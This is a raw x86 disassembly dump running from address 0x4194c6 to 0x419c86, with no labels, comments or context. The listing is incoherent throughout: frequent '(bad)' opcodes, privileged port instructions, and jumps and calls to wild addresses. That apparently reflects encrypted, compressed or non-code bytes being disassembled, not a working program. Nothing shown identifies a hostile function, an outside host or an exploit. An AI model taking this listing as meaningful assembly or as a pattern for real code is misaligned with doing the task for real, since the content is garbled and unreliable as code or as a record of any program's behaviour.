  4194c6:	lods   al,BYTE PTR ds:[esi]
  4194c7:	dec    edi
  4194c8:	out    0x59,al
  4194ca:	outs   dx,BYTE PTR ds:[esi]
  4194cb:	fsub   QWORD PTR [ebx+0xa954596]
  4194d1:	(bad)  
  4194d2:	(bad)  
  4194d4:	and    al,0xe4
  4194d6:	pop    ebp
  4194d7:	push   ecx
  4194d8:	pop    ecx
  4194d9:	js     0x4194c8
  4194db:	retf   0xc0be
  4194de:	or     al,0xed
  4194e0:	test   al,0x64
  4194e2:	xor    al,0xf3
  4194e4:	cli    
  4194e5:	push   edx
  4194e6:	(bad)  
  4194e7:	sub    ah,dl
  4194e9:	add    edx,edx
  4194eb:	pop    edi
  4194ec:	jle    0x41955c
  4194ee:	sub    DWORD PTR [esi-0x5b],ebp
  4194f1:	fisubr DWORD PTR [edx]
  4194f3:	add    BYTE PTR [eax],bl
  4194f5:	stos   BYTE PTR es:[edi],al
  4194f6:	jp     0x41951b
  4194f8:	mov    ah,0xd0
  4194fa:	or     BYTE PTR [edi-0x76],al
  4194fd:	out    0x7c,eax
  4194ff:	daa    
  419500:	dec    edi
  419501:	sub    DWORD PTR [esp+eiz*2],edx
  419504:	call   0x31a2e206
  419509:	or     DWORD PTR [edx-0x5796f4ba],ebx
  41950f:	repz push ss
  419511:	or     DWORD PTR [edx+0x37ddddab],ebx
  419517:	dec    ebx
  419518:	enter  0xcfbc,0xe9
  41951c:	push   edx
  41951d:	jb     0x41953f
  41951f:	xlat   BYTE PTR ds:[ebx]
  419520:	xor    esi,DWORD PTR [edi]
  419522:	repnz scas al,BYTE PTR es:[edi]
  419524:	xlat   BYTE PTR ds:[ebx]
  419525:	add    DWORD PTR [eax-0x58ccfbf6],edi
  41952b:	fidiv  DWORD PTR [esi]
  41952d:	push   es
  41952e:	std    
  41952f:	add    BYTE PTR [edx+esi*2-0x47],dh
  419533:	shr    BYTE PTR [edi-0x45],cl
  419536:	pop    esp
  419537:	mov    bl,0xa
  419539:	nop
  41953a:	or     edi,DWORD PTR [esi-0x33]
  41953d:	shr    DWORD PTR [ecx+0x36],0xf6
  419541:	scas   al,BYTE PTR es:[edi]
  419542:	xor    DWORD PTR [ebp-0x6c],edi
  419545:	mov    eax,edi
  419547:	(bad)
  41954a:	(bad)  
  41954b:	pop    edi
  41954c:	jo     0x41951f
  41954e:	mov    esp,0x6d04571a
  419553:	xchg   edx,eax
  419554:	push   ecx
  419555:	or     BYTE PTR [esi-0x11754d61],al
  41955b:	fisttp DWORD PTR [ebp+0x42]
  41955e:	test   eax,0x756a9b40
  419563:	pop    esp
  419564:	iret   
  419565:	test   BYTE PTR [eax+0x52],0x7f
  419569:	leave  
  41956a:	sbb    ebx,DWORD PTR [ebp-0x27]
  41956d:	push   esp
  41956e:	fdivr  DWORD PTR [ebx+eiz*2-0x14]
  419572:	(bad)  
  419573:	int3   
  419574:	(bad)  
  419575:	out    0x15,al
  419577:	mov    cl,0x53
  419579:	rol    BYTE PTR [eax+0x5],cl
  41957c:	loope  0x41954d
  41957e:	push   0x9163fb1c
  419583:	or     al,0x0
  419585:	cld    
  419586:	into   
  419587:	and    eax,0x94f16c9
  41958c:	in     eax,0x67
  41958e:	dec    esp
  41958f:	and    BYTE PTR [ecx+0x58fbba29],dh
  419595:	pop    ebp
  419596:	jg     0x4195b3
  419598:	push   ss
  419599:	and    al,0x34
  41959b:	and    ebx,DWORD PTR [eax+ebx*8+0x3d0e1f55]
  4195a2:	paddusw mm7,mm3
  4195a5:	xor    al,0xbd
  4195a7:	ret    
  4195a8:	aad    0x7
  4195aa:	rol    edx,cl
  4195ac:	(bad)  
  4195ad:	cwde   
  4195ae:	or     ebp,esi
  4195b0:	(bad)  
  4195b1:	in     al,dx
  4195b2:	xor    eax,0xb60b622e
  4195b7:	in     al,dx
  4195b8:	(bad)  
  4195b9:	icebp  
  4195ba:	scas   al,BYTE PTR es:[edi]
  4195bb:	or     BYTE PTR [esi-0x23],bh
  4195be:	xchg   eax,ebp
  4195c0:	inc    edx
  4195c1:	not    DWORD PTR [esi+0x6c147573]
  4195c7:	xor    DWORD PTR [ebp-0x7ba85da8],ebp
  4195cd:	outs   dx,DWORD PTR ds:[esi]
  4195ce:	sub    ebx,DWORD PTR [ebx+0x150b4f3f]
  4195d4:	retf   0x8f85
  4195d7:	sbb    esp,DWORD PTR [edi]
  4195d9:	out    0x37,eax
  4195db:	sub    al,ah
  4195dd:	loope  0x41958a
  4195df:	sbb    BYTE PTR [eax-0x53824717],0x29
  4195e6:	in     al,dx
  4195e7:	pop    ss
  4195e8:	xchg   esp,eax
  4195e9:	and    eax,0xd6e02fce
  4195ee:	and    eax,0xe3ad8047
  4195f3:	ja     0x419625
  4195f5:	fdivr  DWORD PTR [eax-0x791ddc07]
  4195fb:	mov    dl,0x86
  4195fd:	popa   
  4195fe:	inc    esi
  4195ff:	repnz mov bl,0xe7
  419602:	data16 sub BYTE PTR [ecx-0x3af9bbea],0xb
  41960a:	ror    DWORD PTR [eax-0x7ec812d7],cl
  419610:	pop    esi
  419611:	rcl    DWORD PTR [esi-0x5f],1
  419614:	int    0x70
  419616:	stc    
  419617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419618:	aas    
  419619:	sbb    al,0x82
  41961b:	push   ds
  41961c:	mov    ah,0xe
  41961e:	outs   dx,BYTE PTR ds:[esi]
  41961f:	shl    BYTE PTR [ebx+0x40],0x7a
  419623:	ins    DWORD PTR es:[edi],dx
  419624:	jge    0x4195c7
  419626:	out    0xff,al
  419628:	push   es
  419629:	sar    BYTE PTR [ebx+0x4],0x4e
  41962d:	mov    ds:0x2de37468,eax
  419632:	jnp    0x41962e
  419634:	fisub  WORD PTR [esi-0x49]
  419637:	jns    0x419629
  419639:	pop    esp
  41963a:	ret    
  41963b:	imul   edi,DWORD PTR es:[ecx],0xf5758c7b
  419642:	jmp    0xf2a8c10c
  419647:	mov    esi,0x83ccaf79
  41964c:	xor    DWORD PTR [esi],ebx
  41964e:	ja     0x4196b6
  419650:	pusha  
  419651:	or     eax,0x5df6b58c
  419656:	rcr    BYTE PTR [edx-0x2d],1
  419659:	and    al,0x53
  41965b:	test   eax,0x893d7809
  419660:	jne    0x41967a
  419662:	imul   ecx,DWORD PTR [edx+0x48d31af],0xfffffff9
  419669:	sbb    BYTE PTR [esi-0x77],ah
  41966c:	xchg   BYTE PTR [ebx],dl
  41966e:	ds test al,0x6c
  419671:	mov    eax,ds:0xd1c36fcd
  419676:	in     al,dx
  419677:	in     al,dx
  419678:	ins    DWORD PTR es:[edi],dx
  419679:	(bad)  
  41967a:	dec    edi
  41967b:	cmp    esi,esi
  41967d:	jbe    0x4196a4
  41967f:	sub    al,0xd0
  419681:	sbb    al,0x99
  419683:	(bad)  
  419685:	repnz fs cmp eax,0xb990b5ea
  41968c:	out    0xe6,eax
  41968e:	and    eax,0x91f094ed
  419693:	fsub   QWORD PTR [ecx-0x5e]
  419696:	add    BYTE PTR [edx-0x16],ah
  419699:	mov    dh,0x1f
  41969b:	fstp   st(0)
  41969d:	dec    eax
  41969e:	add    ah,BYTE PTR [edx]
  4196a0:	adc    DWORD PTR [ecx+0x30],edx
  4196a3:	sbb    al,0x7d
  4196a5:	iret   
  4196a6:	pop    ebp
  4196a7:	xor    DWORD PTR [eax],eax
  4196a9:	call   0x2ff64339
  4196ae:	cmc    
  4196af:	inc    eax
  4196b0:	test   BYTE PTR [esi-0x3a],dl
  4196b3:	add    dl,BYTE PTR [ebx]
  4196b5:	sti    
  4196b6:	or     BYTE PTR [ebp+0x357fa870],0x96
  4196bd:	(bad)  [ebx]
  4196bf:	shl    BYTE PTR [ebp+0x24],cl
  4196c2:	cld    
  4196c3:	fwait
  4196c4:	das    
  4196c5:	in     eax,dx
  4196c6:	xor    al,0x33
  4196c8:	fwait
  4196c9:	mov    al,BYTE PTR [ebx+ecx*2-0x6b]
  4196cd:	out    dx,eax
  4196ce:	cli    
  4196cf:	jne    0x4196ed
  4196d1:	push   edx
  4196d2:	jle    0x4196f9
  4196d4:	dec    ecx
  4196d5:	push   esi
  4196d6:	push   ss
  4196d7:	xchg   esi,eax
  4196d8:	dec    eax
  4196d9:	out    dx,al
  4196da:	or     edi,DWORD PTR [edi]
  4196dc:	pop    ss
  4196dd:	add    DWORD PTR [ecx-0x7332eb9f],0x31
  4196e4:	adc    ebp,DWORD PTR [ebp-0x1dff6f20]
  4196ea:	xchg   esi,eax
  4196eb:	jne    0x419736
  4196ed:	dec    edx
  4196ee:	sbb    ch,BYTE PTR [edi]
  4196f0:	or     esi,DWORD PTR es:[ecx+0x32]
  4196f4:	ror    BYTE PTR [edx+0x1],0xbb
  4196f8:	mov    DWORD PTR [edx-0x4b],ecx
  4196fb:	je     0x4196b6
  4196fd:	and    edx,DWORD PTR [esi+ecx*2+0x4f77bc90]
  419704:	pop    ebx
  419705:	add    eax,0xe5c83d80
  41970a:	pop    ds
  41970b:	push   eax
  41970c:	xchg   esp,eax
  41970d:	sub    esp,DWORD PTR [eax]
  41970f:	or     al,0xc7
  419711:	nop
  419712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419713:	jp     0x41972a
  419715:	mov    ds:0x1da09462,al
  41971a:	sbb    dh,BYTE PTR [edi-0x4b]
  41971d:	adc    BYTE PTR [ebx-0x6a243a9c],dh
  419723:	aaa    
  419724:	jg     0x419774
  419726:	cmp    BYTE PTR [edi],0xce
  419729:	hlt    
  41972a:	lock and al,0x71
  41972d:	dec    esp
  41972e:	push   edi
  41972f:	shl    esi,cl
  419731:	jbe    0x4197a4
  419733:	inc    ecx
  419734:	nop
  419735:	icebp  
  419736:	dec    ebx
  419737:	out    dx,al
  419738:	dec    ebp
  419739:	push   ebp
  41973a:	adc    ebx,esp
  41973c:	add    al,0x1c
  41973e:	in     al,0x87
  419740:	cmp    eax,edi
  419742:	pop    edi
  419743:	jecxz  0x41971c
  419745:	in     al,0xa6
  419747:	(bad)  
  419749:	xor    BYTE PTR [ebx+0x2634018a],ah
  41974f:	(bad)  
  419750:	imul   ecx,DWORD PTR [ecx],0x8c1c149e
  419756:	cmp    ebx,DWORD PTR [esi-0x4c]
  419759:	inc    ebp
  41975a:	lahf   
  41975b:	pop    es
  41975c:	jno    0x4197d6
  41975e:	enter  0x59d4,0x9b
  419762:	xchg   ecx,eax
  419763:	jb     0x419703
  419765:	pop    ecx
  419766:	add    ebx,DWORD PTR [ebx-0x6efda3ca]
  41976c:	or     DWORD PTR [ebx],ecx
  41976e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41976f:	pop    ecx
  419770:	cwde   
  419771:	cmp    esi,DWORD PTR [ebx]
  419773:	dec    ebp
  419774:	getsec 
  419776:	xor    dh,dl
  419778:	std    
  419779:	pop    ss
  41977a:	pop    ecx
  41977b:	scas   al,BYTE PTR es:[edi]
  41977c:	loope  0x4197f7
  41977e:	xchg   ebx,eax
  41977f:	mov    ds:0x5bc8e46c,al
  419784:	sbb    bl,al
  419786:	inc    ecx
  419787:	sub    bh,BYTE PTR [ebx]
  419789:	jae    0x4197a4
  41978b:	add    eax,0xfcca87ff
  419790:	mov    edx,0x5be6900b
  419795:	sahf   
  419796:	inc    ebx
  419797:	xchg   ebx,eax
  419798:	gs sahf 
  41979a:	(bad)  
  41979b:	test   al,0x9a
  41979d:	mov    eax,0x66bd0ee
  4197a2:	and    eax,0x7a4a5bf0
  4197a7:	in     al,dx
  4197a8:	test   DWORD PTR [esi+0x60],0x542020e
  4197af:	cmp    eax,0x26c7f3a9
  4197b4:	leave  
  4197b5:	pop    esi
  4197b6:	hlt    
  4197b7:	cld    
  4197b8:	jns    0x419809
  4197ba:	jecxz  0x4197e3
  4197bc:	jb     0x4197d4
  4197be:	hlt    
  4197bf:	xchg   edi,eax
  4197c0:	xor    eax,0x963ec773
  4197c5:	sub    bl,0xad
  4197c8:	jb     0x419756
  4197ca:	cmp    eax,0xf8e7b4f5
  4197cf:	dec    esi
  4197d0:	retf   0x14f1
  4197d3:	sbb    BYTE PTR [ebx+edx*2],cl
  4197d6:	cmp    eax,0xba0ed7ff
  4197db:	inc    ebx
  4197dc:	add    al,0xa9
  4197de:	aas    
  4197df:	rol    esi,1
  4197e1:	fstp   TBYTE PTR [esi-0x69b9a8dd]
  4197e7:	mov    ebx,0xe7077557
  4197ec:	stos   DWORD PTR es:[edi],eax
  4197ed:	mov    esp,0x9e5741e2
  4197f2:	add    DWORD PTR [ebx-0x58],eax
  4197f5:	ret    0x1555
  4197f8:	adc    BYTE PTR [ebx-0x2c],ah
  4197fb:	outs   dx,BYTE PTR ds:[esi]
  4197fc:	or     eax,0x344056a6
  419801:	sbb    ebp,DWORD PTR [eax-0x1f]
  419804:	xor    DWORD PTR [ebx],eax
  419806:	outs   dx,DWORD PTR ds:[esi]
  419807:	call   0x13e0a39
  41980c:	imul   ebp,DWORD PTR [esp+edx*1],0x4
  419810:	mov    ds:0x3101cb06,al
  419815:	add    BYTE PTR [edi+0x26],cl
  419818:	jle    0x41983a
  41981a:	stc    
  41981b:	mov    ecx,0xbf8493d7
  419820:	mov    cl,0x37
  419822:	cld    
  419823:	pop    esp
  419824:	mov    dl,0xa0
  419826:	pop    esp
  419827:	fdivp  st(7),st
  419829:	mov    ecx,eax
  41982b:	and    DWORD PTR [ebp+0x186d7530],ecx
  419831:	rol    BYTE PTR [eax],cl
  419833:	repz in al,dx
  419835:	jmp    0x7c7d:0xc0694c6c
  41983c:	pop    ebx
  41983d:	xlat   BYTE PTR ds:[ebx]
  41983e:	mov    ebp,0x96d74ec2
  419843:	fcomp  DWORD PTR [ebp-0xf]
  419846:	inc    esp
  419847:	mov    bh,0xcc
  419849:	(bad)  
  41984a:	fs ret 0xeb26
  41984e:	ret    0x9a7d
  419851:	cs (bad) 
  419854:	loop   0x4197e6
  419856:	pop    ebp
  419857:	stos   DWORD PTR es:[edi],eax
  419858:	clc    
  419859:	jmp    0x64df636
  41985e:	cmp    esp,DWORD PTR [edi]
  419860:	mov    DWORD PTR [ebx],0x61962cf8
  419866:	(bad)  
  419868:	aas    
  419869:	add    al,0x77
  41986b:	mov    ch,0x5c
  41986d:	or     BYTE PTR [ebx+0x6ad10116],ch
  419873:	cmp    cl,BYTE PTR [ecx]
  419875:	xor    dl,BYTE PTR [esi+0x4da372ff]
  41987b:	jmp    0x60cf:0xc9be3a14
  419882:	gs neg bh
  419885:	aas    
  419886:	adc    eax,0xb5dea92a
  41988b:	cmp    eax,0xbb8db667
  419890:	mov    ds:0x88356081,al
  419895:	cwde   
  419896:	(bad)  
  419897:	push   ecx
  419898:	dec    edi
  419899:	pop    ds
  41989a:	xchg   esp,eax
  41989b:	pop    es
  41989c:	cmp    DWORD PTR [ecx+0x4143aa4c],ecx
  4198a2:	pop    es
  4198a3:	push   cs
  4198a4:	mov    esi,0x50ed0848
  4198a9:	je     0x419865
  4198ab:	pop    esi
  4198ac:	cs imul edi,esi,0x1b712f55
  4198b3:	add    BYTE PTR [ecx-0x22],cl
  4198b6:	ror    DWORD PTR [ecx+0x5c],cl
  4198b9:	aas    
  4198ba:	in     eax,0x43
  4198bc:	xor    BYTE PTR [edi],ah
  4198be:	dec    bp
  4198c0:	xor    DWORD PTR [edx],esi
  4198c2:	data16 icebp 
  4198c4:	out    dx,eax
  4198c5:	je     0x4198a9
  4198c7:	jb     0x41986f
  4198c9:	mov    edi,0x6988ec98
  4198ce:	frstor [eax]
  4198d0:	sbb    bl,BYTE PTR [ebx]
  4198d2:	inc    ebx
  4198d3:	jecxz  0x419858
  4198d5:	repz pushf 
  4198d7:	cdq    
  4198d8:	stc    
  4198d9:	imul   edx,DWORD PTR ds:0xc12ec3d8,0xf1462e8b
  4198e3:	sete   BYTE PTR [eax+0x373816f3]
  4198ea:	jmp    0x419886
  4198ec:	and    edx,DWORD PTR [ecx]
  4198ee:	adc    esp,eax
  4198f0:	mov    al,0x7f
  4198f2:	sub    BYTE PTR [edi+0x44],dh
  4198f5:	dec    esi
  4198f6:	cdq    
  4198f7:	sbb    al,0xaf
  4198f9:	or     eax,0x9400a465
  4198fe:	daa    
  4198ff:	mov    edi,0x21870d9e
  419904:	push   ebx
  419905:	and    eax,DWORD PTR [ebx-0x422d82f4]
  41990b:	shl    DWORD PTR [eax],1
  41990d:	pop    eax
  41990e:	push   eax
  41990f:	xor    eax,0xa0d10c48
  419914:	ins    DWORD PTR es:[edi],dx
  419915:	lock retf 0x8a86
  419919:	leave  
  41991a:	ins    DWORD PTR es:[edi],dx
  41991b:	test   al,0x44
  41991d:	stos   BYTE PTR es:[edi],al
  41991e:	inc    ecx
  41991f:	add    al,BYTE PTR [ecx-0x4cefa625]
  419925:	sbb    al,0x4f
  419927:	dec    ebp
  419928:	or     al,0xf4
  41992a:	call   0x7cd70014
  41992f:	jno    0x4198b6
  419931:	dec    edx
  419932:	mov    dh,0xe3
  419934:	in     al,0xe5
  419936:	dec    ecx
  419937:	out    dx,al
  419938:	jae    0x4198ca
  41993a:	pop    eax
  41993b:	push   ss
  41993c:	cmp    eax,0x9f431389
  419941:	addr16 ror ebp,1
  419944:	sbb    eax,0x800b54b9
  419949:	sub    al,0x32
  41994b:	mov    ebp,0x7dc259a4
  419950:	stos   BYTE PTR es:[edi],al
  419951:	addr16 xchg edi,eax
  419953:	clc    
  419954:	cmp    BYTE PTR [ebx+0x463d4fd],cl
  41995a:	or     eax,0xc40745f7
  41995f:	mov    esi,0x3b065918
  419964:	jmp    0x960065ed
  419969:	dec    esp
  41996a:	ins    BYTE PTR es:[edi],dx
  41996b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41996c:	cmp    dh,cl
  41996e:	in     eax,0x75
  419970:	or     al,0x6
  419972:	dec    eax
  419973:	sub    eax,0x73cc9d5e
  419978:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419979:	test   BYTE PTR [ecx],0x88
  41997c:	push   eax
  41997d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41997e:	mov    edi,0x9480efc8
  419983:	in     al,dx
  419984:	adc    al,BYTE PTR [ecx-0xd]
  419987:	inc    ebx
  419988:	mov    eax,0x198c8131
  41998d:	popa   
  41998e:	xor    al,0xa
  419990:	test   eax,0x560a154b
  419995:	aam    0x46
  419997:	(bad)  
  419998:	(bad)  
  419999:	fsub   QWORD PTR [ecx+0x5e]
  41999c:	nop
  41999d:	dec    edi
  41999e:	not    DWORD PTR [ecx]
  4199a0:	std    
  4199a1:	into   
  4199a2:	retf   0x8718
  4199a5:	dec    DWORD PTR ss:0x3d3a5e6a
  4199ac:	push   ebx
  4199ad:	les    ecx,FWORD PTR [esi-0x23e1eb3a]
  4199b3:	out    0x8,al
  4199b5:	push   0x5c110877
  4199ba:	sbb    al,BYTE PTR [ebp+ebx*8+0x171502c4]
  4199c1:	mov    ah,BYTE PTR [ebx-0x5cf57e69]
  4199c7:	add    al,ch
  4199c9:	and    BYTE PTR [eax+edx*4+0x56d66f93],al
  4199d0:	xlat   BYTE PTR ds:[ebx]
  4199d1:	jne    0x4199ae
  4199d3:	cwde   
  4199d4:	das    
  4199d5:	mov    WORD PTR [eax+0x2d],?
  4199d8:	cs ret 0xa786
  4199dc:	loope  0x41996e
  4199de:	fnstcw WORD PTR [edi+esi*1+0x7308a8cd]
  4199e5:	addr16 sub eax,0xfc0f4e4
  4199eb:	hlt    
  4199ec:	test   DWORD PTR [bx+si],0x9a5a983b
  4199f3:	adc    BYTE PTR [esi-0x97679ff],ch
  4199f9:	sub    BYTE PTR [ebx],dl
  4199fb:	pop    ecx
  4199fc:	sub    dh,bl
  4199fe:	mov    al,cl
  419a00:	jbe    0x4199d4
  419a02:	mov    dh,BYTE PTR [edx]
  419a04:	mov    esp,0xb3eff489
  419a09:	sub    eax,0x9f935a4d
  419a0e:	push   ecx
  419a0f:	push   esi
  419a10:	mov    al,ds:0x813d79c0
  419a15:	sbb    ebx,DWORD PTR [ecx-0x24]
  419a18:	inc    edx
  419a19:	add    bh,bl
  419a1b:	push   ebp
  419a1c:	mov    edx,0x84052bdf
  419a21:	pop    esi
  419a22:	sub    eax,0xef4a669
  419a27:	or     esi,DWORD PTR [ebx+0x6b]
  419a2a:	aad    0x5a
  419a2c:	pop    esp
  419a2d:	fiadd  DWORD PTR [eax*1-0x45522d6b]
  419a34:	xor    ebx,DWORD PTR gs:[ecx+0x7d4b4cd]
  419a3b:	and    DWORD PTR [ecx-0xc],ebp
  419a3e:	mov    DWORD PTR [ecx],eax
  419a40:	arpl   WORD PTR [ebp-0x1f1ebc6f],si
  419a46:	mov    ebx,0x18da5b93
  419a4b:	mov    ebx,0x260e2093
  419a50:	jb     0x419a49
  419a52:	add    ch,BYTE PTR [edx+0x6a]
  419a55:	mov    ch,0xa0
  419a57:	fist   DWORD PTR [ecx-0x4b2fdd6d]
  419a5d:	outs   dx,DWORD PTR ds:[esi]
  419a5e:	jne    0x419ad7
  419a60:	and    ecx,DWORD PTR [eax]
  419a62:	fst    DWORD PTR [edx]
  419a64:	inc    esi
  419a65:	imul   esi,DWORD PTR [ebp-0x44],0x11
  419a69:	push   ebp
  419a6a:	int    0x2
  419a6c:	cmp    esi,DWORD PTR [edx-0x566f6ac0]
  419a72:	loope  0x419a4e
  419a74:	push   eax
  419a75:	xor    DWORD PTR [edi+0x16b03b06],0x66
  419a7c:	inc    edi
  419a7d:	pop    ebx
  419a7e:	cmc    
  419a7f:	jmp    0x419a4b
  419a81:	lds    ecx,FWORD PTR [esi]
  419a83:	push   esp
  419a84:	fstp   QWORD PTR [edx-0x326ccaad]
  419a8a:	scas   eax,DWORD PTR es:[di]
  419a8c:	lods   al,BYTE PTR ds:[esi]
  419a8d:	jb     0x419a45
  419a8f:	dec    esp
  419a90:	fcom   DWORD PTR [esi]
  419a92:	inc    WORD PTR [ebx+edi*4+0x7d4ca656]
  419a9a:	cmp    BYTE PTR [ebx+0x6b46ff7b],ah
  419aa0:	icebp  
  419aa1:	inc    esp
  419aa2:	adc    al,0xd0
  419aa4:	inc    esi
  419aa5:	xor    dl,dl
  419aa7:	int3   
  419aa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419aa9:	push   edi
  419aaa:	out    dx,eax
  419aab:	int3   
  419aac:	mov    ds:0x3e91f4a1,eax
  419ab1:	sbb    edi,0x7e
  419ab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ab5:	pop    edi
  419ab6:	jb     0x419aea
  419ab8:	add    bh,BYTE PTR [edx-0x16]
  419abb:	mov    al,ds:0x194aae33
  419ac0:	sbb    esi,eax
  419ac2:	jp     0x419ab2
  419ac4:	imul   ecx,DWORD PTR [edi+0x35],0xd0fb329c
  419acb:	cmc    
  419acc:	sub    ebp,DWORD PTR [ebx+0x56]
  419acf:	pop    ebx
  419ad0:	dec    eax
  419ad1:	mov    bl,0x57
  419ad3:	xchg   ecx,eax
  419ad4:	ss push ebp
  419ad6:	loop   0x419b53
  419ad8:	or     dl,BYTE PTR [edx+0x47]
  419adb:	rcr    DWORD PTR [esi-0x3e76a3b7],1
  419ae1:	sub    ebx,DWORD PTR [ecx]
  419ae3:	daa    
  419ae4:	mov    eax,0xf720129f
  419ae9:	sub    al,0xcd
  419aeb:	jns    0x419a99
  419aed:	call   0x87046e46
  419af2:	adc    al,0x6e
  419af4:	sbb    BYTE PTR es:0x469116aa,cl
  419afb:	mov    WORD PTR [esi+0x2e1bdb8],?
  419b01:	xchg   ebp,eax
  419b02:	fs push ebx
  419b04:	ret    
  419b05:	fwait
  419b06:	xchg   edi,eax
  419b07:	jne    0x419a8a
  419b09:	xor    BYTE PTR [ebp-0x692c8079],0x52
  419b10:	pop    ebp
  419b11:	ins    DWORD PTR es:[edi],dx
  419b12:	retf   0xfaf
  419b15:	jg     0x419b15
  419b17:	gs in  eax,0xba
  419b1a:	push   ebx
  419b1b:	mov    ah,0x7c
  419b1d:	stc    
  419b1e:	mov    ebp,fs
  419b20:	cwde   
  419b21:	stos   BYTE PTR es:[edi],al
  419b22:	push   edx
  419b23:	mov    al,0x89
  419b25:	mov    bh,0x9b
  419b27:	or     dl,bl
  419b29:	retf   
  419b2a:	push   ss
  419b2b:	std    
  419b2c:	xor    ebx,eax
  419b2e:	repnz add al,0x29
  419b31:	stc    
  419b32:	mov    ebx,DWORD PTR [ecx+0x27c89356]
  419b38:	xchg   ecx,eax
  419b39:	not    DWORD PTR [eax]
  419b3b:	inc    eax
  419b3c:	jbe    0x419bbd
  419b3e:	or     DWORD PTR [ecx+ebp*4+0x4682a942],esp
  419b45:	pop    ebp
  419b46:	adc    al,0x28
  419b48:	das    
  419b49:	adc    DWORD PTR [edi+0x6e],esp
  419b4c:	je     0x419b06
  419b4e:	ss xchg edx,eax
  419b50:	test   DWORD PTR [ecx-0x2a446d1a],esp
  419b56:	xor    ebp,esi
  419b58:	popf   
  419b59:	xchg   edx,eax
  419b5a:	xchg   DWORD PTR [edx-0x1e],edx
  419b5d:	cs (bad) 
  419b5f:	and    dl,BYTE PTR [eax+0x2477b7af]
  419b65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b66:	enter  0xa02c,0x5c
  419b6a:	mov    bh,0x16
  419b6c:	call   0x34537b11
  419b71:	outs   dx,DWORD PTR ds:[esi]
  419b72:	test   eax,0x38a21f3b
  419b77:	arpl   sp,si
  419b79:	cmp    eax,0x9f5145a7
  419b7e:	aaa    
  419b7f:	ror    BYTE PTR [ebx-0x765897d8],1
  419b85:	mov    edx,0xb7eb43d9
  419b8a:	push   es
  419b8b:	repz hlt 
  419b8d:	loop   0x419b2d
  419b8f:	ss inc esp
  419b91:	add    BYTE PTR [edi],ah
  419b93:	mov    ebp,0xe8425106
  419b98:	xchg   ebp,eax
  419b99:	test   al,0xfe
  419b9b:	jnp    0x419bb2
  419b9d:	or     bh,BYTE PTR [esi-0x51]
  419ba0:	pop    edx
  419ba1:	push   ebx
  419ba2:	push   esi
  419ba3:	xor    eax,0xc7a4eaf
  419ba8:	sbb    eax,0xfcf3f456
  419bad:	pushf  
  419bae:	rcr    DWORD PTR [edx+ebx*4-0x77738698],0xd3
  419bb6:	dec    ecx
  419bb7:	jo     0x419bd3
  419bb9:	mov    bl,0x9a
  419bbb:	mov    al,0x46
  419bbd:	fcomp  DWORD PTR [ebp+0x40]
  419bc0:	pshufw mm6,QWORD PTR [esi],0x8
  419bc4:	xchg   ebx,eax
  419bc5:	das    
  419bc6:	pop    esi
  419bc7:	or     ah,BYTE PTR [eax+0x5ec3d392]
  419bcd:	out    dx,eax
  419bce:	(bad)  
  419bcf:	imul   esp,DWORD PTR [edx-0x5c],0x27
  419bd3:	add    esp,ebp
  419bd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bd6:	push   cs
  419bd7:	cli    
  419bd8:	call   0x80eb75ae
  419bdd:	sbb    al,0x5a
  419bdf:	push   0xf8791b6c
  419be4:	xor    edi,DWORD PTR [esi]
  419be6:	and    DWORD PTR [ecx-0x28],esp
  419be9:	mov    cl,0x7e
  419beb:	data16 cmp BYTE PTR [eax+0x3a],0x83
  419bf0:	mov    ds:0x2e3fcf94,eax
  419bf5:	xchg   edx,eax
  419bf6:	in     al,0xea
  419bf8:	push   ebp
  419bf9:	mov    ah,0x7e
  419bfb:	or     edi,DWORD PTR [eax]
  419bfd:	sub    al,0x27
  419bff:	aad    0x89
  419c01:	fmul   st,st(6)
  419c03:	lods   eax,DWORD PTR ds:[esi]
  419c04:	xchg   esi,eax
  419c05:	sub    al,0xe2
  419c07:	cs (bad) 
  419c09:	gs push cs
  419c0b:	mov    al,ds:0xaab821ce
  419c10:	xor    BYTE PTR [edi+0x36],0xd9
  419c14:	mov    edx,0xa75bbf67
  419c19:	popa   
  419c1a:	dec    esp
  419c1b:	lock out dx,eax
  419c1d:	push   0xfffffff9
  419c1f:	mov    dl,0x6d
  419c21:	push   es
  419c22:	ins    BYTE PTR es:[edi],dx
  419c23:	xchg   ecx,eax
  419c24:	aad    0x39
  419c26:	pop    ss
  419c27:	jns    0x419c15
  419c29:	mov    bl,al
  419c2b:	fbld   TBYTE PTR [edi+0x47]
  419c2e:	or     DWORD PTR [eax],ecx
  419c30:	inc    edx
  419c31:	push   esi
  419c32:	push   edx
  419c33:	mov    al,0xfb
  419c35:	nop
  419c36:	sub    cl,bl
  419c38:	neg    BYTE PTR [eax+0x64]
  419c3b:	nop
  419c3c:	stos   DWORD PTR es:[edi],eax
  419c3d:	es push ss
  419c3f:	jl     0x419c39
  419c41:	shr    BYTE PTR [ebp+0x45],cl
  419c44:	idiv   DWORD PTR [edx+0x368c1f53]
  419c4a:	scas   eax,DWORD PTR es:[edi]
  419c4b:	pop    ecx
  419c4c:	jbe    0x419c0c
  419c4e:	pop    esi
  419c4f:	sbb    bh,BYTE PTR [ecx]
  419c51:	mov    ds,ebx
  419c53:	mov    ebp,0x34fee9da
  419c58:	sub    BYTE PTR [ebp-0x5f34f63f],ah
  419c5e:	clc    
  419c5f:	inc    ebp
  419c60:	imul   ebp,DWORD PTR [ecx+0x17],0x95626ba8
  419c67:	pop    ebp
  419c68:	or     al,0xcd
  419c6a:	stc    
  419c6b:	aaa    
  419c6c:	xlat   BYTE PTR ds:[ebx]
  419c6d:	push   0xffffffaa
  419c6f:	pop    edi
  419c70:	xlat   BYTE PTR ds:[ebx]
  419c71:	sbb    DWORD PTR [bp+si],ecx
  419c74:	mov    ah,0xa5
  419c76:	sbb    al,BYTE PTR [edi+0x17213433]
  419c7c:	inc    esi
  419c7d:	mov    dl,0x64
  419c7f:	push   cs
  419c80:	xor    dh,BYTE PTR [eax+0x510b82d6]
  419c86:	mov    ch,0xc0
